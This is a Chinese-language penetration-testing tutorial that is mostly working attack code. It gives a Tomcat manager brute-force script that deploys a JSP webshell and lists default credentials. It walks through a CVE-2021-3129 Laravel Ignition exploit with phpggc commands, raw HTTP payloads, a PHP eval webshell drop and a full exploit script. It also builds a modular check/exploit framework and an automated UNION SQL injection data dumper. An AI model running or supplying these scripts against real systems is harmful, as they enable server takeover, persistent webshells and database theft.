# 0x01 tomcat getshell

tomcat默认密码为：

    
    
    tomcat:tomcat
    tomcat:123456
    admin:tomcat
    admin:123456
    admin:admin

点击 `manager app` 。

![](./img/8320332325667349591.png)

这里将jsp webshell压缩为zip修改后缀为war上传即可。

webshell项目地址 `https://github.com/tennc/webshell/tree/master/jsp`。

或者哥斯拉生成webshell。

![](./img/2062150771158936913.png)

连接`http://192.168.1.103:8080/1/1.jsp`。

![](./img/4483801427798524194.png)

### 1.1 exp编写

首先我们需要先来爆破tomcat。先看到tomcat如何认证。

测试登录账号为1密码为2。抓包得到

![](./img/4908951705043225883.png)

可以看到这里存在一个字段为： `Authorization: Basic MToy`。解密 `MToy` 。

![](./img/2138557288284566946.png)

可以看到为账号:密码。

    
    
    import requests
    import base64
    import re
    import os
    def geturl(url,exploit):
        s = requests.Session()
        manager_app_url = url + "/manager/html"
        manager_app_url_status = s.get(manager_app_url).status_code
        if(manager_app_url_status == 401):
            with open('./exp/tomcat/user.txt') as user_open:
                for users in user_open.readlines():
                    user_text = users.strip()
                    with open('./exp/tomcat/pass.txt') as pass_open:
                        for passes in pass_open.readlines():
                            pass_text = passes.strip()
                            auth = user_text + ":" + pass_text
    
                            auth_base = base64.b64encode(auth.encode('utf-8'))
                            auth_base = str(auth_base).replace("b'","").replace("'","")
                            header = {
                                'Authorization': 'Basic '+auth_base,
                            }
                            # proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
                            req = s.get(manager_app_url,headers=header)
                            print(auth+" is trying")
                            requ_status = req.status_code
                            if(requ_status == 200):
                                cookie = requests.utils.dict_from_cookiejar(req.cookies)
                                cookie = str(cookie.get('JSESSIONID'))
                                print("[+]cookie:"+cookie)
                                print("[+]" + auth + " login successful!")

**直接getshell**

首先看到正常上传时的post包

![](./img/7287018185335344772.png)

首先需要获取cookie里面的session值，可以看到访问 `manager/html`时候返回包的头就会有。

![](./img/8583130514391656677.png)

    
    
    cookie = requests.utils.dict_from_cookiejar(req.cookies)
    cookie = str(cookie.get('JSESSIONID'))

通过`requests.utils.dict_from_cookiejar` 获取与`cookie`，为dict类型通过get方法获取值。

然后就是获取csrf_token值。

![](./img/1273969883828343907.png)

这里通过正则匹配。

    
    
    csrf_pattern = re.compile('org.apache.catalina.filters.CSRF_NONCE=(.*)">')
    csrf_token = csrf_pattern.findall(req.text)
    print("[+]csrf_token:" + csrf_token[0])

设置post url以及cookie和auth字段

    
    
    post_url = url + "/manager/html/upload?
    org.apache.catalina.filters.CSRF_NONCE="+csrf_token[0]
    header2 = {
        'Authorization': 'Basic '+auth_base,
        'Cookie': 'JSESSIONID='+cookie+'; PrivateComputer=true',
    }

添加上传的文件。

    
    
    webshell = {'deployWar':open("2.war","rb")}
    post_req = s.post(post_url,headers=header2,files=webshell,verify=False)
    webshell_path = url + "/2/1.jsp"
    if(requests.get(webshell_path).status_code == 200):
        print("[+]drop webshell successful")
        print("[+]webshell:"+webshell_path)
    break

因为这里的webshell名字为1.jsp压缩为1.zip修改名字为2.war所以访问路径为/2/1.jsp。

如果为2.jsp -> 2.war 则路径为/2/2.jsp。其他同理。

![](./img/5937113994876075731.png)

![](./img/312999042890875458.png)

完整exp：

    
    
    import requests
    import base64
    import re
    import os
    def geturl(url,exploit):
        s = requests.Session()
        manager_app_url = url + "/manager/html"
        manager_app_url_status = s.get(manager_app_url).status_code
        if(manager_app_url_status == 401):
            with open('./exp/tomcat/user.txt') as user_open:
                for users in user_open.readlines():
                    user_text = users.strip()
                    with open('./exp/tomcat/pass.txt') as pass_open:
                        for passes in pass_open.readlines():
                            pass_text = passes.strip()
                            auth = user_text + ":" + pass_text
    
                            auth_base = base64.b64encode(auth.encode('utf-8'))
                            auth_base = str(auth_base).replace("b'","").replace("'","")
                            header = {
                                'Authorization': 'Basic '+auth_base,
                            }
                            # proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
                            req = s.get(manager_app_url,headers=header)
                            print(auth+" is trying")
                            requ_status = req.status_code
                            if(requ_status == 200):
                                cookie = requests.utils.dict_from_cookiejar(req.cookies)
                                cookie = str(cookie.get('JSESSIONID'))
                                print("[+]cookie:"+cookie)
                                print("[+]" + auth + " login successful!")
                                if(exploit == 0):
                                    break
                                else:
                                    csrf_pattern = re.compile('org.apache.catalina.filters.CSRF_NONCE=(.*)">')
                                    csrf_token = csrf_pattern.findall(req.text)
                                    print("[+]csrf_token:" + csrf_token[0])
                                    post_url = url + "/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE="+csrf_token[0]
                                    header2 = {
                                        'Authorization': 'Basic '+auth_base,
                                        'Cookie': 'JSESSIONID='+cookie+'; PrivateComputer=true',
                                    }
                                    webshell = {'deployWar':open("./exp/tomcat/2.war","rb")}
                                    post_req = s.post(post_url,headers=header2,files=webshell,verify=False)
                                    webshell_path = url + "/2/1.jsp"
                                    if(requests.get(webshell_path).status_code == 200):
                                        print("[+]drop webshell successful")
                                        print("[+]webshell:"+webshell_path)
                                    break

# 0x02 CVE-2021-3129

使用
[phpggc](https://github.com/ambionics/phpggc)工具生成一条laravel中存在的反序列化利用POC（经过编码后的）

    
    
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
    
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.52.20:8000
    Content-Type: application/json
    Content-Length: 168
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "xxxxxxx"
      }
    }

当出现了Ignition的报错，说明漏洞存在，且开启了debug模式

![](./img/8699507688338496717.png)

1.首先发送下面数据包将原日志文件laravel.log清空

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.52.20:8000
    Content-Type: application/json
    Content-Length: 168
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }

如果出现500重新发送

2.发送下面数据包给Log增加一次前缀，用于对齐

    
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "AA"
      }
    }

3.用phpggc生成phar序列化利用POC

    
    
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"

在生成的payload后面加上一个a

4.将POC作为viewFile的值，发送数据包

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.52.20:8000
    Content-Type: application/json
    Content-Length: 5058
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=66=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=4C=00=71=00=2F=00=42=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4C=00=71=00=2F=00=42=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=64=00=30=00=6B=00=2F=00=31=00=70=00=52=00=49=00=71=00=57=00=72=00=36=00=77=00=46=00=6C=00=38=00=30=00=4D=00=2B=00=48=00=4B=00=2B=00=57=00=61=00=63=00=4E=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"
      }
    }

5.发送如下数据包，清空对log文件中的干扰字符，只留下POC

    
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }

这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试。

6.使用phar进行反序列化，执行任意代码（此时需要使用绝对路径）

    
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
      }
    }

![](./img/1466514131649331933.png)  
利用成功

编写exp:

    
    
    import json
    import pyfiglet
    import requests
    import argparse
    
    ascii_banner = pyfiglet.figlet_format("CVE-2021-3129")
    print(ascii_banner)
    
    parser = argparse.ArgumentParser("python CVE-2021-3129.py -u url --check <--shell>\r\n Example:python CVE-2021-3129.py url")  # 当们在命令行输入错误时，进行提示
    parser.add_argument("-u",dest='attack_url',help="url")
    parser.add_argument("-f",dest='attack_payload',help="payload file")
    parser.add_argument("--check",dest="check_vul",help="check the vuln",nargs='?',const = 'phpinfo.txt')
    parser.add_argument("--shell",dest="get_shell",help="getshell",nargs='?',const = 'shell.txt')
    args = parser.parse_args()
    url = args.attack_url
    payload = args.attack_payload
    
    if(args.check_vul == None and args.get_shell == None and payload == None):
        print("python CVE-2021-3129.py -h for help")
        exit(-1)
    
    if(args.check_vul != None and payload != None):
        print("python CVE-2021-3129.py -h for help")
        exit(-1)
    
    if(payload != None and args.get_shell != None):
        print("python CVE-2021-3129.py -h for help")
        exit(-1)
    
    if(args.check_vul != None and args.get_shell != None):
        print("python CVE-2021-3129.py -h for help")
        exit(-1)
    
    while(url.endswith('/')):
        url = list(url)
        url.pop()
        url = "".join(url)
    
    payloads = []
    
    choose_file_flag = 0
    check_flag = 0
    getshell_flag = 0
    
    if(args.check_vul == None and args.get_shell == None):
        choose_file_flag = 1
        try:
            with open(payload,'r',encoding='utf-8') as f:
                for data in f.readlines():
                    data = data.strip('\n')
                    payloads.append(data)
        except:
            print("file not found!")
            exit(-1)
    
    if(args.get_shell == None and payload == None and args.check_vul != None):
        check_flag = 1
        try:
            with open('phpinfo.txt','r',encoding='utf-8') as f:
                for data in f.readlines():
                    data = data.strip('\n')
                    payloads.append(data)
        except:
            print("file not found!")
            exit(-1)
    
    if(args.get_shell != None and payload == None and args.check_vul == None):
        getshell_flag = 1
        try:
            with open('shell.txt','r',encoding='utf-8') as f:
                for data in f.readlines():
                    data = data.strip('\n')
                    payloads.append(data)
        except:
            print("file not found!")
            exit(-1)
    
    session = requests.Session()
    
    headers = {
        'Content-Type':'application/json'
    }
    
    poc = {
        'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters':{
            'variableName':'username',
            'viewFile':'xxxxxxx'
        }
    }
    
    first_payload = {
        'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters':{
            'variableName':'username',
            'viewFile':'php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log'
        }
    }
    
    second_payload = {
        'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters':{
            'variableName':'username',
            'viewFile':'AA'
        }
    }
    
    third_payload = {
        'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters':{
            'variableName':'username',
            'viewFile':payloads[0]
        }
    }
    
    fourth_payload = {
        'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters':{
            'variableName':'username',
            'viewFile':'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log'
        }
    }
    
    fifth_payload = {
        'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution',
        'parameters':{
            'variableName':'username',
            'viewFile':'phar:///var/www/storage/logs/laravel.log/test.txt'
        }
    }
    
    Test_url = url + '/_ignition/execute-solution'
    poc_test = session.post(url=Test_url,json=poc,headers=headers)
    resp_poc_test = poc_test.text
    flag = 0
    if('file_get_contents' in resp_poc_test):
        flag = 1
        print("[+]%s maybe is vulnerable!!!" % url)
    else:
        print("[-]%s is not vulnerable" % url)
        exit(-1)
    
    if(flag == 1):
        reverse_log = session.post(url=Test_url,json=first_payload,headers=headers)
        flag = 0
        while(reverse_log.status_code != 200):
            flag += 1
            reverse_log = session.post(url=Test_url,json=first_payload,headers=headers)
            if(flag >= 5):
                print("[-]需要手工测试")
                exit(-1)
        print("[+]Clear log success")
        flag = 1
    
    if(flag == 1):
        alignment = session.post(url=Test_url,json=second_payload,headers=headers)
        print("[+]alignment success")
    
    if(flag == 1):
        poc_send = session.post(url=Test_url,json=third_payload,headers=headers)
        print("[+]payload send success")
    
    if(flag == 1):
        flag = 0
        clear_poc = session.post(url=Test_url,json=fourth_payload,headers=headers)
        while(clear_poc.status_code != 200):
            flag += 1
            clear_poc = session.post(url=Test_url,json=fourth_payload,headers=headers)
            if(flag >= 5):
                print("[-]maybe the Absolute path error!!!")
                exit(-1)
        print("[+]clear success!")
        flag = 1
    
    
    # choose_file_flag = 0
    # check_flag = 0
    # getshell_flag = 0
    
    
    if(flag == 1 and getshell_flag == 1):
        exec_payload = session.post(url=Test_url,json=fifth_payload,headers=headers)
        webshell = url + '/shell.php'
        check_webshell = session.get(webshell)
        if(check_webshell.status_code == 200):
            print("[+]webshell upload success!!")
            print("-"* 40)
            print("[+]webshell path:"+webshell)
        else:
            print("[-]webshell upload failed")
    
    if(flag == 1 and check_flag == 1):
        exec_payload = session.post(url=Test_url,json=fifth_payload,headers=headers)
        if('info()' in exec_payload.text):
            print("[+]%s is vulnerable" % url)
        else:
            print("[-]%s is not vulnerable" % url)
    
    if(flag == 1 and choose_file_flag == 1):
        exec_payload = session.post(url=Test_url,json=fifth_payload,headers=headers)
        print("[+]payload has been sent, please verify by yoursel")

![](./img/9103657357548843432.png)

![](./img/5188718460014098995.png)

# 0x03 自动化poc工具编写

    
    
    import sys
    import importlib
    import pyfiglet
    
    def poc(url,pocpath):
        exploit = 0
        url = url
        poc_path = "exp"+pocpath.replace("/",".")
        importpoc = importlib.import_module(poc_path)
        importpoc.geturl(url,exploit)
    
    def exp(url,pocpath):
            exploit = 1
            url = url
            poc_path = "exp"+pocpath.replace("/",".")  # pocpath = exp.tomcat.wargetshell
            importpoc = importlib.import_module(poc_path)
            importpoc.geturl(url,exploit)
    def listAllPoc():
        print("list all poc:")
        list = """
        /tomcat/wargetshell 弱口令部署war包getshell
        """
        print(list)
    if __name__ == "__main__":
        if(len(sys.argv) == 2):
            if(sys.argv[1] == "--list"):
                listAllPoc()
                exit(0)
        if(len(sys.argv) == 5):
            url = sys.argv[2]
            file = sys.argv[4]
            if(sys.argv[3] == "--check"):
                poc(url,file)
            elif(sys.argv[3] == "--exploit"):
                exp(url,file)
            else:
                result = pyfiglet.figlet_format(text="Ypoc", font="smslant")
                print(result)
                print("usage:")
                print("         python3 ypoc.py --list")
                print("         python3 ypoc.py -u http://127.0.0.1 --exploit /tomcat/wargetshell")
                print("         python3 ypoc.py -u http://127.0.0.1 --check /tomcat/wargetshell")
        else:
            result = pyfiglet.figlet_format(text="Ypoc", font="smslant")
            print(result)
            print("usage:")
            print("         python3 ypoc.py --list")
            print("         python3 ypoc.py -u http://127.0.0.1 --exploit /tomcat/wargetshell")
            print("         python3 ypoc.py -u http://127.0.0.1 --check /tomcat/wargetshell")

![](./img/6824450579655849588.png)

我们把exp统一放在exp目录里面对应的系统名字。例如：`./exp/tomcat/wargetshell.py`。

    
    
    import requests
    import base64
    import re
    import os
    def geturl(url,exploit):
        s = requests.Session()
        manager_app_url = url + "/manager/html"
        manager_app_url_status = s.get(manager_app_url).status_code
        if(manager_app_url_status == 401):
            with open('./exp/tomcat/user.txt') as user_open:
                for users in user_open.readlines():
                    user_text = users.strip()
                    with open('./exp/tomcat/pass.txt') as pass_open:
                        for passes in pass_open.readlines():
                            pass_text = passes.strip()
                            auth = user_text + ":" + pass_text
    
                            auth_base = base64.b64encode(auth.encode('utf-8'))
                            auth_base = str(auth_base).replace("b'","").replace("'","")
                            header = {
                                'Authorization': 'Basic '+auth_base,
                            }
                            # proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
                            req = s.get(manager_app_url,headers=header)
                            print(auth+" is trying")
                            requ_status = req.status_code
                            if(requ_status == 200):
                                cookie = requests.utils.dict_from_cookiejar(req.cookies)
                                cookie = str(cookie.get('JSESSIONID'))
                                print("[+]cookie:"+cookie)
                                print("[+]" + auth + " login successful!")
                                if(exploit == 0):
                                    break
                                else:
                                    csrf_pattern = re.compile('org.apache.catalina.filters.CSRF_NONCE=(.*)">')
                                    csrf_token = csrf_pattern.findall(req.text)
                                    print("[+]csrf_token:" + csrf_token[0])
                                    post_url = url + "/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE="+csrf_token[0]
                                    header2 = {
                                        'Authorization': 'Basic '+auth_base,
                                        'Cookie': 'JSESSIONID='+cookie+'; PrivateComputer=true',
                                    }
                                    webshell = {'deployWar':open("./exp/tomcat/2.war","rb")}
                                    post_req = s.post(post_url,headers=header2,files=webshell,verify=False)
                                    webshell_path = url + "/2/1.jsp"
                                    if(requests.get(webshell_path).status_code == 200):
                                        print("[+]drop webshell successful")
                                        print("[+]webshell:"+webshell_path)
                                    break

![](./img/7105964093429963640.png)

如果我们调用`--check`那么就只检测登录是否成功。如果为`--exploit`那么就去尝试getshell。  
例如sql注入

    
    
    import requests
    def geturl(url,exploit):
        url_len = len(requests.get(url).text)
        column_count = 0
        union_return = ""
        for i in range(1,10):
            order_payload = url + " order by "+str(i)
            order_len = len(requests.get(order_payload).text)
            if(url_len != order_len):
                order_payload = url + " order by "+str(i-1)
                column_count = i-1
                break
        for i in range(1,column_count+1):
            union_return = union_return+str(i)+","
        union_return = union_return.strip(',')
        union_payload = url + " union select " + union_return
        print(requests.get(union_payload).text)
        count_choose = input("set count:")
        table = union_return.replace(count_choose,"group_concat(table_name)")
        table_payload = url + " union select "+ table + " from information_schema.tables where table_schema=database()"
        print(requests.get(table_payload).text)
        table_choose = input("choose table_name:")
        column = union_return.replace(count_choose,"group_concat(column_name)")
        column_payload = url + " union select "+column + " from information_schema.columns where table_schema=database() and table_name='"+table_choose+"'"
        print(requests.get(column_payload).text)
        dump_choose = input("choose dump:")
        dump = union_return.replace(count_choose,"group_concat("+dump_choose+")")
        dump_payload = url + " union select " + dump + " from " + table_choose
        print(requests.get(dump_payload).text)

![](./img/6612901417928572197.png)

![](./img/1269121283675246459.png)

